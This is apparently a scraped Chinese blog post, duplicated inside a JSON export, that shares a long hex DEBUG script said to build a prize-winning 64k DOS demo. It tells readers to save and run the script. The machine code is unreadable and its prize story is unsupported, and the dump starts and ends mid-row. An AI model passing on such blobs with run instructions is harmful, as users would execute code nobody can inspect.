c4 33 df b1 d1 91 98 1e 81 a5 e2 59 9f f4 8c b6 72 8 a7 8c f6 e a3  b2 1f<br />e455 d9 d3 23 f0 7c 5e 5f 68 61 8b 45 da 1d 91 ec 8d 4e ea 1a 38 85 94  aa ac<br />e46d f2 4 f6 c4 e5 92 8e 9a 4e 83 e1 73 e8 cf 2a 5c 2b 7e f1 30 2 8a e6  28 1a<br />e486 3b ce bc 96 aa 7f eb 87 cd 8b 96 2d 9 59 7a a0 1a 43 62 9a 9e 4f ff  8e d9<br />e49f ce d6 a4 70 79 cd 65 fa 2e 92 14 29 f7 6c 74 4b 49 60 80 bb ff 41  bb 2d<br />e4b7 60 33 3f 98 77 9a 1 ee a6 a3 da bc ba e9 f3 72 f4 7c c3 59 2 a6 44  a4 c8<br />e4d0 c8 54 93 ce bd 69 bb b9 43 21 2c c4 ea 4a 5c 3f 75 60 f2 b4 91 ca 9  82 e3<br />e4e9 a e9 a6 20 b9 76 50 ed 47 e9 fe 6d 41 34 13 2f 28 2f 4e f4 da e 3c  78 6c<br />e502 b1 79 87 45 98 a4 d4 c3 b3 29 c2 4a 8b ed a6 54 e2 1b 31 62 60 ff  2c 1d<br />e51a 21 0 15 b2 4e 5c c 2 d 83 fa a2 f3 8a 5 12 72 4a c7 44 7c 91 d4 be b  a f2<br />e535 70 52 fb b4 a2 df 89 de ff c4 96 73 c9 c ed d3 c9 8e 5c dc 8e d1 3b  de 8c<br />e54e 53 a2 8b f9 e9 91 dd d6 df 6e 74 d1 dd 34 60 8f 9e 32 7f 3b ec 79  a3 83<br />e566 45 78 b4 2f 1c 50 7b 7a 97 b0 9d 2d c dd 8a 26 cd 7d 8c 4c 5a 8a 4c  f9 a4<br />e57f 11 f9 2c 6c 92 e9 b5 cb 56 89 8c be f6 64 fa 25 43 fa 6f e2 c8 3a  18 a8<br />e597 f0 e9 f4 c2 86 e6 2b 44 67 4a b9 34 9 ed 5f 33 42 62 d4 8a 1e 5b 31  67 cd<br />e5b0 3d 71 6d 83 fd 36 20 69 ea 1 c3 e6 e6 de 99 aa 7 11 5b 59 8a 1f 43  83 52<br />e5c9 ea 5d 8c 6a 69 c7 3 eb 4e 3b 88 a5 5f b1 6e 27 5f 3 5c 28 c 9b 6c  c3 f8<br />e5e2 e5 b9 d6 11 d6 8b fa 5c 8 c7 1 eb 45 db f3 6c 9f 16 46 61 51 ed df f  bb<br />e5fb c0 c4 1e 64 68 98 4 79 30 94 72 df d4 cd 1f 7f 72 c6 82 2e 79 47 4e  8c 4b<br />e614 a2 c7 e2 36 df 76 fd a4 b6 4e db 96 40 3b 8b b5 d4 85 64 c6 0 2c ad  9d 27<br />e62d 14 99 82 4b bc 9 fa 94 b5 db 7c 98 eb b 13 a7 b0 79 1d 7e c5 45 aa  20 49<br />e646 be ff 9d 64 0 5d c ec 6 5 ad f2 38 6b ed 7a d6 b2 c7 2e 6a a6 12 4b  ff 55<br />e660 20 3b a 77 f b9 0 9d 57 4a ad ce a4 d3 ff 1 4f fb 53 54 88 f 1 ed  4b 56<br />e67a 15 c8 dc 28 bf f2 72 d4 10 1f 99 42 69 9e 78 e2 47 82 93 31 d0 2d  be 9f<br />e692 93 93 9a 1b 80 c0 10 c 53 78 a0 26 2a 96 4f 74 4b 16 c7 9c 8d ad ac  fb 16<br />e6ab 15 c6 fd c9 a4 14 48 62 47 20 c9 41 ed 61 f8 9b f8 ff ba 39 50 65  87 ee<br />e6c3 bd ce 95 c0 fb a5 7e d8 cd 27 fd 2c 74 3 c1 1b 89 b9 51 d5 e3 da ef  9e 6<br />e6dc f0 aa a9 a7 fb 87 4c 5d cd ff 65 36 8c 73 6f 9 c6 78 9a b6 77 db df  81 68<br />e6f5 3b b8 ae 5d e1 af d4 e6 66 8c d6 a4 83 9f 37 3c 1 dc a2 a6 57 c2 20  1b 90<br />e70e 75 df cd a5 62 a5 36 79 fb 35 8a 9b b0 a0 a5 c3 37 6f 80 72 bc 52  30 8d<br />e726 9f 7a 64 d3 7 41 45 d8 68 97 f2 aa 1c a1 6c 7c 9d 32 7d ad 15 b1 53  e3 33<br />e73f 8a ed e9 49 d4 cf dc 96 22 37 36 11 9d 7f f0 4d e0 62 31 b1 c7 69  c4 79<br />e757 ac 20 1 e8 3c 6a 8c 32 cb 52 63 36 68 f4 10 2b 9c 21 4f df 5d 60 92  39 91<br />e770 e2 f9 c9 7d ca 48 3 3f 21 dd 6c f 23 2e 61 3a 9f ba c3 f9 4e 7 ea  ed ef<br />e789 71 4a 72 3a ed 23 3d 77 b5 ed d5 1d f6 a4 99 fa ef 98 dd 2 98 80 b6  7c a3<br />e7a2 62 96 7b 8e bf 7b 81 9f 9a ce 3f 12 40 2e 25 db 84 16 dd 2e 86 f f4  b2 7e<br />e7bb 5e b4 14 6a f3 29 b1 a4 57 d5 a8 17 6f 87 a4 74 5b 9b 17 79 f1 ec  33 c8<br />e7d3 f0 1d b2 7e a8 4d 95 7f 5f 9 d5 1a 5a 45 f4 41 c6 d 3f eb 66 2a c0  e8 5b<br />e7ec 3c bd 50 ad f1 53 9d 2e 45 9a d8 7d 2c 17 a8 6e 15 48 13 39 53 ed  3d 78<br />e804 ad f 3a 65 a3 3e 2e fa ca 7 94 4a 1f b4 d8 7e 47 8a 8e de e7 7e 34  c1 69<br />e81d 7f 6a aa 66 58 18 31 24 72 13 22 34 8a 56 36 87 df c2 d 8e 3f 71 a2  5f 25<br />e836 8b 8d 4 78 fd c9 45 d1 55 79 c1 9f 13 84 1b c8 5 db 95 d0 7c 64 96  20 51<br />e84f c4 e0 5e ee 47 8a 11 ac fb 9 e0 bb 40 db 86 84 12 93 b9 c9 f2 9c 63  47 c9<br />e868 eb ad 1 3e fa 6d 3f a 64 5b 58 56 27 f ca 5d e0 30 bc 3e 10 5d ec  17 28<br />e881 85 5 51 8e 95 a3 94 3a a8 f1 96 f2 f 29 5c 97 dc 47 db 9d 6c 63 e8  e7 f0<br />e89a e4 a 70 f8 f1 47 54 d3 2d 32 7c ef bb 9a b4 1b 0 2b d6 dd e7 30 b  a2 75<br />e8b3 c7 f5 d0 31 d7 d2 8a b0 ac 1c 6d 60 3a f7 c2 db 1e 6d 7 f6 8f 35 88  e5 7f<br />e8cc 3c 26 81 34 a0 32 a3 25 18 6e 73 b2 a0 f1 cb 86 61 e7 65 8b 76 98  19 6f<br />e8e4 c0 62 9b a3 cc 18 5e 40 12 97 2b d0 15 79 de 19 ea df 7a 59 2f b5  d7 39<br />e8fc 52 e2 6 f1 3 a0 a5 d9 1b 88 93 4d 30 c8 2d f5 db 55 ea 85 6f a 3f  dc bd<br />e915 57 15 6a a3 a3 3e 8e ad 2d da a0 ca 75 7c 57 8b c5 cb b 1d 2c 8e c6  96 2e<br />e92e 6d 59 83 7d 64 72 ca 80 2e 6 a4 ff f6 f2 d5 1e 7 4 ba 34 6e 9 86 25  aa 4e<br />e948 e0 7f f5 32 47 3e 7c 43 d8 28 c4 1c 11 1d bd 33 3 b5 ca 13 43 34 2  b1 a0<br />e961 57 ed 9d 3c 23 d4 45 b2 6e 81 6e af 3e 67 90 be 59 a5 45 34 53 46  85 d1<br />e979 25 ee 7d cb a4 db 12 c3 aa 17 61 9a fb 66 40 76 fe 3a 69 96 c0 91  14 a7<br />e991 5d cc 9f f6 73 59 ee b8 55 97 20 26 ff 99 ec 72 41 b5 27 21 6e ae  8a d0<br />e9a9 e4 d3 da 6f c4 53 c5 f8 b3 a7 a1 5d 66 93 d8 b1 89 40 23 92 c0 90  fb cb<br />e9c1 e7 6b 4e 51 0 5d 57 f7 cd 1 e2 88 bf 44 9f ef c4 33 ce fa 46 46 a1  86 b<br />e9da 7a 84 66 66 b9 2 ec 10 c6 a1 d4 c1 18 33 b1 d1 2 18 ad 2f 53 e4 b9  33 59<br />e9f3 be 3c af 80 4\nc 8a d5 76 c 3b a7 e2 97 94 15 75 4d 17 d5 97 cf f9 4a  d0 6e<br />ea0c bb 27 20 fc f1 f5 9 a8 df 4d b6 5d f0 1d 69 3b 76 35 82 a4 f3 56 64  39 5b<br />ea25 6b b3 7 e7 5 8e 82 11 22 a8 1a db c8 3e 67 4a 3 7e 72 51 d6 3d 1a  1c f6<br />ea3e b8 da 4b 18 8a 15 9d d0 a4 84 96 3e cd 3 f9 3a 30 f3 fb 8f 6e 2 73  eb 52<br />ea57 93 95 cf dc 6f 48 fb ab d2 a9 70 b4 e2 23 8d 72 86 a8 fa 78 98 1d  c5 fe<br />ea6f 8a 51 88 2b b7 58 b0 ca ae 40 8a 33 32 75 1 6 c0 d4 b7 da 2a a7 bb  ad f7<br />ea88 48 98 5a bc d3 d1 e6 16 97 c3 80 ab 73 ac 32 11 41 1f d 5d aa 0 dc  d9 6e<br />eaa1 fc 30 6 ef 11 60 27 a2 5f eb 5f b9 35 8 23 4 be 10 c0 85 3e 55 b3  82 fd<br />eaba f7 c3 24 9f 2d 83 94 32 36 de ff 7c 87 7f 4a 80 7 2 23 cf a4 52 eb  3e 19<br />ead3 a0 b4 a 94 1a 40 58 d9 16 6d c0 64 c4 69 ed 60 46 65 cb df 58 38 0  51 c3<br />eaec ad a0 37 e4 cf ab f7 6c 24 7d 9 48 65 4a 9f 91 ad 1c 79 a4 a1 78 55  c e8<br />eb05 44 5b d ef 51 bd ea 2d a7 42 57 ab 3a 4f 2 b 3 19 6a 4d 72 76 5c 97  0 6c<br />eb1f c5 5d bc dd e7 81 cf 8d 34 38 50 3c 98 58 cc 41 aa 99 90 af fe 4e  96 77<br />eb37 ed 54 18 ce 2c d1 5d 34 cb 79 50 ff 28 96 44 e0 51 64 6 a8 b7 6e 8c  62 c4<br />eb50 66 95 81 4f 8c f6 26 ba ea 5d d2 79 b1 e4 e9 29 fc a fd b3 85 8c e6  52 dd<br />eb69 33 bd 5d c7 39 ef 6 ef 9e a6 6a 61 9c 9f d5 54 b4 fa a1 d4 10 9b ff  7e 33<br />eb82 11 52 99 c7 26 6e a1 36 8a ad ee 48 7a 2c 7f d5 b7 27 8a 6b 37 c 71  39 85<br />eb9b 9c ba a8 a 17 b9 d0 51 56 95 c2 3b 5 a7 31 c5 8b 5c 95 6e 4c 89 6f  17 ef<br />ebb4 d4 5a a 77 65 e1 49 b2 e8 72 ac 3c f0 6b 71 fa 3 c7 ca fc ad f9 55  22 ec<br />ebcd 58 2f 1c fa 29 cf 73 b4 ad 51 5c f8 66 70 59 5d 70 3e d1 3f c4 eb  ec f1<br />ebe5 7 78 6a 93 67 9f 44 fc cb 5b 95 ff 74 c0 b7 42 77 26 c9 aa 8c ed 39  a2 db<br />ebfe 9c b3 eb 3d 4a 1e 9b 89 e4 d8 a8 27 74 ef a3 ed a5 24 5d bb ab d0  fe a1<br />ec16 29 ab df 75 a a6 23 0 cc f1 14 72 9b 1a 55 7e e5 d1 da 98 dc c4 cf  ab 34<br />ec2f ba 8d de 4a 59 6 13 dd d8 44 3c e bb 56 95 ae 97 e2 3b 49 e5 9a 6b  a2 53<br />ec48 c1 33 35 24 1b 33 17 c3 8a 8c 12 3d 3d 4e 5b 75 22 30 67 4f a0 5d  3a 78<br />ec60 88 a 11 35 7 b1 77 42 32 a8 c3 bb 20 fb 98 5 d6 ac e7 3a 63 35 90  93 9e<br />ec79 44 24 2e 1b d7 8c aa 29 53 4d d9 ab eb e6 1 56 c4 fd 54 a3 bd 14 5b  b0 8f<br />ec92 ce be 23 24 93 c4 48 18 a3 e7 4 5 4b 78 cc 79 dd 3 56 a4 ed dd 5f  98 41<br />ecab 1b 68 4c c1 bb 41 c2 1e 3e 94 8e ef 28 1e b 76 e 4f 36 b1 c 6e e2  18 17<br />ecc4 20 fc 35 40 1f e4 6d a4 18 bb bc d5 9e ea 85 86 af af 63 d4 13 66  92 c4<br />ecdc 2b 69 84 ca 23 2b d3 66 81 6b 81 73 26 4 85 36 21 4c 49 44 75 64 39  16 3c<br />ecf5 ed e0 6d 44 75 45 30 43 68 c0 78 fc d0 17 b eb 81 3e c3 ba 1b f 4d  ae c5<br />ed0e 55 1f c 39 12 5d 8 65 f1 34 59 de dd 98 56 17 43 38 66 49 9a eb db  c1 87<br />ed27 51 38 cc b7 5f 98 fd 43 be 2d bb 74 f3 f8 f2 36 3d a4 34 a5 7e d2  26 cc<br />ed3f 84 1f ea 56 f0 80 18 69 4d 88 41 fc 56 fd 41 3b 1e e 9 27 4f f6 3b  62 4e<br />ed58 5a 1b 2a 4e 85 8c b2 4f 79 ef 59 4e e 73 3d bd c4 ca 60 e7 4a 47 90  b5 8<br />ed71 2a f0 4e dc ba 66 ae 48 2b 31 73 a2 11 c 32 ff 54 14 77 6b d6 58 4b  bf ee<br />ed8a f6 6a bc dd 1 88 d da a9 f 81 24 c5 f8 72 9a db d5 c8 2a 80 a9 16  d7 c6<br />eda3 b1 91 c0 a9 95 40 b5 b3 a8 2a 28 c6 92 16 ab 54 7d f8 93 5f 3a 17  c8 45<br />edbb a9 f0 e0 71 23 76 53 38 a5 a1 cc d4 f1 f2 3c 2b 46 43 a1 d5 ba e d7  19 7a<br />edd4 c2 e1 8f 67 1d d 98 9d a1 79 9d 1b 20 7f 4d e7 bf f9 ff fe aa 28 ab  8f c<br />eded 4d 50 33 e3 26 fc 3c 3 3a 2b 26 12 f7 1 8f ee 97 4c e6 6 2b d9 1f  a1 4a<br />ee06 77 44 d4 8b b7 3e 5e 2d 18 c3 54 68 99 a8 8d 92 96 9e 9d ab 33 38  ff b8<br />ee1e ee 78 c6 7b b5 84 95 d3 6 27 ae 5d 27 38 a 38 8e f0 1 a5 96 4b d7  9b 42<br />ee37 e5 6f 57 75 4c e9 78 2d 5b ec b6 d2 29 e2 a8 92 95 9c 65 2a 3e bf  8d e0<br />ee4f bf b3 ac c8 e 7e 13 af 88 26 7d 48 5a c7 39 29 36 d2 90 e8 3b 3 d0  61 1a<br />ee68 d2 e8 a8 f ba 8e a1 9f df 12 ab 54 7 23 98 de 62 af 4c 7e d4 fb 6b 2  6e<br />ee81 40 40 37 b7 73 f2 d8 81 be 29 d2 99 c0 73 25 1a 3c 92 75 6e bd d7  79 79<br />ee99 4 14 c0 4e 99 57 66 93 74 ec b0 29 7c df 61 b0 3 3a d1 c3 fa a4 f7 f  9f<br />eeb2 d3 f 0 b9 2a 5a 3a c5 88 25 b8 b9 cc 82 3 57 3a e1 7b 51 75 70 a6  74 1a<br />eecb ca cb 3 18 68 ca 77 fe 1b ad cd 68 7f 36 85 fc b7 4f a0 11 da 69 fa  79 87<br />eee4 d6 b9 21 dd 3e 70 db dc 84 d4 6e d1 20 4 af f6 32 a2 8e d 54 25 fe 7  54<br />eefd e 7a 74 4b a0 4b f7 f4 e8 74 22 e9 98 70 fb 25 2e f4 64 57 75 28 85  45 53<br />ef16 3a 2e e2 3c 54 36 e9 29 6 67 59 43 10 7e c1 49 cd 5e f9 97 a 58 5f  8a 11<br />ef2f 4f 3d 9a e2 2b 22 58 fa be fc 69 91 7a 8c 3f 77 9f c9 3b 54 26 23  93 b3<br />ef47 85 de ae f5 bd c5 47 4c c4 cd 5e ad bc 8f ba 31 f6 e4 70 fb 6e a7  96 d5<br />ef5f ad 10 80 39 43 97 4f 10 cc 1b 8f 8d cd 4c 63 4 d8 1e 85 70 41 6c a8  eb df<br />ef78 7f 36 c5 60 a7 12 9 16 73 fe 75 3a 2d 40 29 7d aa a 5c 2 29 23 0 a6  e5 6b<br />ef92 24 6d 9b 20 e5 7 cb 40 b0 38 59 9c a7 69 6a 70 d3 38 ef e2 b2 11 3e  ea 2a<br />efab f9 2b 2e 43 1d 65 cf d6 1b ef 83 5a 5f e6 c5 62 16 ca 5e 4c a6 39  e4 53<br />efc3 2d 23 d2 5e 7e 15 54 8a 8 b7 3d bb 88 59 b9 9e a2 7c 42 1f a2 77 3c  5b 9<br />efdc 6d fa 8f 21 46 1a 3e ed ce 49 56 1d 29 2d 70 3 a7 6f 75 ac 1 87 ff  27 86<br />eff5 73 49 28 85 2d 97 7a 84 e 37 3d 86 10 21 4c e2 74 62 6b 51 70 8f 15  72 f3<br />e100e 81 b2 a9 9d 8a 63 ad 1b d5 aa 8a dc 96 3c e7 47 16 51 fc 87 50 9  b7 60<br />e1026 29 33 52 fb b0 df 70 c5 65 4a 60 3b c d7 a8 29 47 51 f7 8a 77 f3  99 3f<br />e103e 38 16 60 de 68 27 b2 24 7 62 a2 fd 40 86 b2 75 c3 3c 2f 3d fa 9 d9  a9 9a<br />e1057 71 3c ce 46 94 0 f9 bc 46 7f b8 2e 85 7f 7d d3 8d ea b4 63 81 59  10 bb<br />e106f 57 d0 b6 ab e1 83 74 1e 25 d5 73 78 18 b1 60 62 c f4 76 8d 17 d5  ed 23<br />e1087 23 e4 f6 32 64 5a 61 9 63 f6 92 57 d5 29 40 d6 3b ba 63 72 18 0 25  1b 7<br />e10a0 ee 7f 25 4a fa 6 74 19 46 e3 e8 89 7a c6 56 54 a7 43 13 4e bf 97  a5 6f<br />e10b8 99 2f ac 33 4d fa 58 3a 5a a a4 1a 74 62 c8 4f 3b 78 9 d7 ee 7e ee  2d 69<br />e10d1 30 40 ea 47 82 3b 85 8e 3 23 8f 74 4e 8 35 ab 74 4 1 57 d5 85 b1  6b 1e<br />e10ea f4 7d 1e d2 1e b3 fe f3 12 10 32 39 51 48 2d 6f e5 d3 a3 8c 8 8<br />g<br />rcx<br />fff<br />n1.com<br />w<br />q<br />----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code>把上面的代码保存为debug111.txt<br />再运行 ---》debug&lt;debug111.txt<br />你将看到什么？去看看吧&#160;&#160;<br />key“alt +enter” is to stop screen<br />然后结束进程就可以了。<br />这代码真的很变态，太强悍了、","slug":"世界编程大赛的一等奖debug64k作品欣赏","published":1,"updated":"2023-04-22T05:38:44.969Z","_id":"clgrjlxle00al7opi9txkca1x","comments":1,"layout":"post","photos":[],"link":"","content":"<p>世界编程大赛的一等奖debug64k作品欣赏                                                               我在网上看到的最美丽的debug，请注意是—–美丽转载：批处理之家<br />代码:<code>----------------------------------------------------------------------------------<br /></code><code>----------------------------------------------------------------------------------</code><br /><code>e100 33 f6 bf 0 20 b5 10 f3 a5 8c c8 5 0 2 50 68 13 1 cb e 1f  be a1 1 bf 0 1<br />e11b 6 57 b8 11 1 bb 21 13 89 7 4b 4b 48 79 f9 ad 86 e0 8b c8 bd ff ff  e8 20<br />e134 0 3d 0 1 74 1a 7f 3 aa eb f3 2d ff 0 50 e8 f 0 5a f7 d8 8b d8 26 8a  1 aa<br />e14f 4a 75 f9 eb de cb 57 bb 21 13 8b c1 40 f7 27 f7 f5 8b fb ba 11 1 4f  4f 4a<br />e168 39 5 7f f9 52 8b c5 f7 25 f7 37 2b c8 95 f7 65 2 f7 37 95 2b e8 fe e  fe<br />e181 10 79 6 c6 6 fe 10 7 46 d0 14 d1 d1 d1 e5 79 ec 5a b8 11 1 ff 7 4b  4b 48<br />e19b 3b d0 75 f7 5f c3 83 f7 83 a6 5d 59 82 cd b2 8 42 46 9 57 a9 c5 ca  aa 1b<br />e1b4 4f 52 b4 92 3f ab 6e 9e a8 1d c6 3 fc e 6a e7 ae bb 5f 7b 10 b8 b4  f7 8<br />e1cd e2 bf 36 4e 39 9d 79 29 3f a f9 36 52 16 fb 5 e8 e5 a6 c2 e9 b0 43  d3 a3<br />e1e6 cf d3 fd fd cb d1 4c 5e e0 63 58 86 bb 3e 9 c1 20 bc cc 91 a3 47 81  70 b3<br />e1ff d6 1a 9e c2 c9 12 e7 4e ad f4 5f e3 30 e9 9 39 d7 e8 f9 f4 d2 44 e8  d7 22<br />e218 be e2 ce 88 25 cf 30 4a a8 29 ae 3f 47 c6 2d 85 e9 73 54 13 b e6 e0  34 65<br />e231 e2 50 8a 89 18 5f ce 70 99 3 5f 42 bf eb 7 ae d0 ca 5 22 8d 22 a5  b7 f0<br />e24a 90 81 bc 7a bc dc 5 db c0 6a 2 e5 57 38 be 60 cb ac ba a5 3b 9d f1  77 38<br />e263 a6 84 d1 3c af 49 d8 6a 45 a2 76 60 21 12 c0 c2 44 f2 5e bb e5 37  a9 2b<br />e27b ec 4a 8c 4c f2 f7 a9 58 71 2b ba 6d d6 6a e5 60 46 e0 da e5 b9 90  e5 a3<br />e293 f7 7f 31 60 58 f0 c4 88 10 4e 3c a3 ee 4e 11 55 8f a 92 eb db ad 7a  9c f<br />e2ac db 5a 28 96 da 87 ae 91 91 2d e3 5e ea df 6 95 71 67 71 40 ce d1 2e  31 6d<br />e2c5 c1 9c d8 6a 76 9b 4a e8 36 44 d6 76 d 30 5 ff d4 1b ac 1f 32 65 31  bf 55<br />e2de 26 b a4 55 e1 5d 5e 16 ed 97 48 6c 77 fb 81 86 e f9 18 bd d4 f4 8b  de 1d<br />e2f7 ba d 47 75 3 89 4b 3e dc 27 86 1c d0 17 89 48 d1 a6 8d d4 2b 54 4e  8f b0<br />e310 2 e1 6b 1a 75 78 ea 21 91 13 c0 cf 78 a0 ab f3 35 c6 b4 c8 90 8d d7  45 e7<br />e329 c 5b a4 ba 52 10 64 f5 4a 50 b7 ec 46 22 15 23 84 30 81 5c df 61 5a  8f 67<br />e342 c4 63 57 6d f7 26 92 a3 1f e5 3 a5 0 54 41 8 48 7c 26 90 33 82 9c  91 b0<br />e35b ab 78 5d df 99 e0 b9 fc 5 36 ac d9 49 91 ab 20 a2 63 48 89 ce 5c 60  64 f0<br />e374 63 d9 a8 38 3b d3 e6 4c 8c 23 34 4e 20 51 93 5e 6d b4 7a 22 9b 4c  f2 d3<br />e38c c4 f8 3 6f 47 40 f4 f8 45 9b 83 f3 83 6 31 d0 0 17 82 83 dc 67 f9  62 77<br />e3a5 90 3b d9 ec f3 55 96 b8 d9 db 79 55 f1 e5 8c 5e f2 e5 2e b0 b 6e e2  81 25<br />e3be 93 8e b5 dd 5b 46 f9 af ed 6 12 cf c9 1d f0 f7 3b 16 2d c6 58 73 8d  e9 5f<br />e3d7 fd 5a b6 a1 94 4d 1a 8 ff eb b7 6 80 c7 86 83 b6 b9 fd 1c e0 c c3  2e a0<br />e3f0 2f b 3e 3 6b 29 e1 27 85 1c ea 6d df b3 a3 ed 65 4a 9a 59 3b 54 e  4b ae<br />e409 9e 27 f0 4d 3b c 4c 46 b7 e5 57 1b 1f 1f bb 80 86 f5 b7 ef 73 52 bf  2c c7<br />e422 ed a b7 81 2 f3 90 3e ee cc 6c eb f 38 1 6c 68 b1 d 45 78 b2 f f6  83 b0<br />e43c c4 33 df b1 d1 91 98 1e 81 a5 e2 59 9f f4 8c b6 72 8 a7 8c f6 e a3  b2 1f<br />e455 d9 d3 23 f0 7c 5e 5f 68 61 8b 45 da 1d 91 ec 8d 4e ea 1a 38 85 94  aa ac<br />e46d f2 4 f6 c4 e5 92 8e 9a 4e 83 e1 73 e8 cf 2a 5c 2b 7e f1 30 2 8a e6  28 1a<br />e486 3b ce bc 96 aa 7f eb 87 cd 8b 96 2d 9 59 7a a0 1a 43 62 9a 9e 4f ff  8e d9<br />e49f ce d6 a4 70 79 cd 65 fa 2e 92 14 29 f7 6c 74 4b 49 60 80 bb ff 41  bb 2d<br />e4b7 60 33 3f 98 77 9a 1 ee a6 a3 da bc ba e9 f3 72 f4 7c c3 59 2 a6 44  a4 c8<br />e4d0 c8 54 93 ce bd 69 bb b9 43 21 2c c4 ea 4a 5c 3f 75 60 f2 b4 91 ca 9  82 e3<br />e4e9 a e9 a6 20 b9 76 50 ed 47 e9 fe 6d 41 34 13 2f 28 2f 4e f4 da e 3c  78 6c<br />e502 b1 79 87 45 98 a4 d4 c3 b3 29 c2 4a 8b ed a6 54 e2 1b 31 62 60 ff  2c 1d<br />e51a 21 0 15 b2 4e 5c c 2 d 83 fa a2 f3 8a 5 12 72 4a c7 44 7c 91 d4 be b  a f2<br />e535 70 52 fb b4 a2 df 89 de ff c4 96 73 c9 c ed d3 c9 8e 5c dc 8e d1 3b  de 8c<br />e54e 53 a2 8b f9 e9 91 dd d6 df 6e 74 d1 dd 34 60 8f 9e 32 7f 3b ec 79  a3 83<br />e566 45 78 b4 2f 1c 50 7b 7a 97 b0 9d 2d c dd 8a 26 cd 7d 8c 4c 5a 8a 4c  f9 a4<br />e57f 11 f9 2c 6c 92 e9 b5 cb 56 89 8c be f6 64 fa 25 43 fa 6f e2 c8 3a  18 a8<br />e597 f0 e9 f4 c2 86 e6 2b 44 67 4a b9 34 9 ed 5f 33 42 62 d4 8a 1e 5b 31  67 cd<br />e5b0 3d 71 6d 83 fd 36 20 69 ea 1 c3 e6 e6 de 99 aa 7 11 5b 59 8a 1f 43  83 52<br />e5c9 ea 5d 8c 6a 69 c7 3 eb 4e 3b 88 a5 5f b1 6e 27 5f 3 5c 28 c 9b 6c  c3 f8<br />e5e2 e5 b9 d6 11 d6 8b fa 5c 8 c7 1 eb 45 db f3 6c 9f 16 46 61 51 ed df f  bb<br />e5fb c0 c4 1e 64 68 98 4 79 30 94 72 df d4 cd 1f 7f 72 c6 82 2e 79 47 4e  8c 4b<br />e614 a2 c7 e2 36 df 76 fd a4 b6 4e db 96 40 3b 8b b5 d4 85 64 c6 0 2c ad  9d 27<br />e62d 14 99 82 4b bc 9 fa 94 b5 db 7c 98 eb b 13 a7 b0 79 1d 7e c5 45 aa  20 49<br />e646 be ff 9d 64 0 5d c ec 6 5 ad f2 38 6b ed 7a d6 b2 c7 2e 6a a6 12 4b  ff 55<br />e660 20 3b a 77 f b9 0 9d 57 4a ad ce a4 d3 ff 1 4f fb 53 54 88 f 1 ed  4b 56<br />e67a 15 c8 dc 28 bf f2 72 d4 10 1f 99 42 69 9e 78 e2 47 82 93 31 d0 2d  be 9f<br />e692 93 93 9a 1b 80 c0 10 c 53 78 a0 26 2a 96 4f 74 4b 16 c7 9c 8d ad ac  fb 16<br />e6ab 15 c6 fd c9 a4 14 48 62 47 20 c9 41 ed 61 f8 9b f8 ff ba 39 50 65  87 ee<br />e6c3 bd ce 95 c0 fb a5 7e d8 cd 27 fd 2c 74 3 c1 1b 89 b9 51 d5 e3 da ef  9e 6<br />e6dc f0 aa a9 a7 fb 87 4c 5d cd ff 65 36 8c 73 6f 9 c6 78 9a b6 77 db df  81 68<br />e6f5 3b b8 ae 5d e1 af d4 e6 66 8c d6 a4 83 9f 37 3c 1 dc a2 a6 57 c2 20  1b 90<br />e70e 75 df cd a5 62 a5 36 79 fb 35 8a 9b b0 a0 a5 c3 37 6f 80 72 bc 52  30 8d<br />e726 9f 7a 64 d3 7 41 45 d8 68 97 f2 aa 1c a1 6c 7c 9d 32 7d ad 15 b1 53  e3 33<br />e73f 8a ed e9 49 d4 cf dc 96 22 37 36 11 9d 7f f0 4d e0 62 31 b1 c7 69  c4 79<br />e757 ac 20 1 e8 3c 6a 8c 32 cb 52 63 36 68 f4 10 2b 9c 21 4f df 5d 60 92  39 91<br />e770 e2 f9 c9 7d ca 48 3 3f 21 dd 6c f 23 2e 61 3a 9f ba c3 f9 4e 7 ea  ed ef<br />e789 71 4a 72 3a ed 23 3d 77 b5 ed d5 1d f6 a4 99 fa ef 98 dd 2 98 80 b6  7c a3<br />e7a2 62 96 7b 8e bf 7b 81 9f 9a ce 3f 12 40 2e 25 db 84 16 dd 2e 86 f f4  b2 7e<br />e7bb 5e b4 14 6a f3 29 b1 a4 57 d5 a8 17 6f 87 a4 74 5b 9b 17 79 f1 ec  33 c8<br />e7d3 f0 1d b2 7e a8 4d 95 7f 5f 9 d5 1a 5a 45 f4 41 c6 d 3f eb 66 2a c0  e8 5b<br />e7ec 3c bd 50 ad f1 53 9d 2e 45 9a d8 7d 2c 17 a8 6e 15 48 13 39 53 ed  3d 78<br />e804 ad f 3a 65 a3 3e 2e fa ca 7 94 4a 1f b4 d8 7e 47 8a 8e de e7 7e 34  c1 69<br />e81d 7f 6a aa 66 58 18 31 24 72 13 22 34 8a 56 36 87 df c2 d 8e 3f 71 a2  5f 25<br />e836 8b 8d 4 78 fd c9 45 d1 55 79 c1 9f 13 84 1b c8 5 db 95 d0 7c 64 96  20 51<br />e84f c4 e0 5e ee 47 8a 11 ac fb 9 e0 bb 40 db 86 84 12 93 b9 c9 f2 9c 63  47 c9<br />e868 eb ad 1 3e fa 6d 3f a 64 5b 58 56 27 f ca 5d e0 30 bc 3e 10 5d ec  17 28<br />e881 85 5 51 8e 95 a3 94 3a a8 f1 96 f2 f 29 5c 97 dc 47 db 9d 6c 63 e8  e7 f0<br />e89a e4 a 70 f8 f1 47 54 d3 2d 32 7c ef bb 9a b4 1b 0 2b d6 dd e7 30 b  a2 75<br />e8b3 c7 f5 d0 31 d7 d2 8a b0 ac 1c 6d 60 3a f7 c2 db 1e 6d 7 f6 8f 35 88  e5 7f<br />e8cc 3c 26 81 34 a0 32 a3 25 18 6e 73 b2 a0 f1 cb 86 61 e7 65 8b 76 98  19 6f<br />e8e4 c0 62 9b a3 cc 18 5e 40 12 97 2b d0 15 79 de 19 ea df 7a 59 2f b5  d7 39<br />e8fc 52 e2 6 f1 3 a0 a5 d9 1b 88 93 4d 30 c8 2d f5 db 55 ea 85 6f a 3f  dc bd<br />e915 57 15 6a a3 a3 3e 8e ad 2d da a0 ca 75 7c 57 8b c5 cb b 1d 2c 8e c6  96 2e<br />e92e 6d 59 83 7d 64 72 ca 80 2e 6 a4 ff f6 f2 d5 1e 7 4 ba 34 6e 9 86 25  aa 4e<br />e948 e0 7f f5 32 47 3e 7c 43 d8 28 c4 1c 11 1d bd 33 3 b5 ca 13 43 34 2  b1 a0<br />e961 57 ed 9d 3c 23 d4 45 b2 6e 81 6e af 3e 67 90 be 59 a5 45 34 53 46  85 d1<br />e979 25 ee 7d cb a4 db 12 c3 aa 17 61 9a fb 66 40 76 fe 3a 69 96 c0 91  14 a7<br />e991 5d cc 9f f6 73 59 ee b8 